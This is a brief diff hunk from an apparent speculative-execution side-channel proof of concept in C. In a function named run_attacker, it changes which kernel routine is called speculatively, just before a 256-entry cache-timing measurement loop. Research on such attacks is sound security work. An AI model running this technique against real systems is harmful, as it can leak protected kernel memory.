@@ -68,7 +68,7 @@ int run_attacker(int kernel_fd, char *shared_memory) {
             usleep(5);
 
             // 3. SPECULATIVE call
-            call_kernel_part2(kernel_fd, shared_memory, current_offset);
+            call_kernel_part3(kernel_fd, shared_memory, current_offset);
 
             // 4. MEASURE
             for (int i = 0; i < 256; i++) {
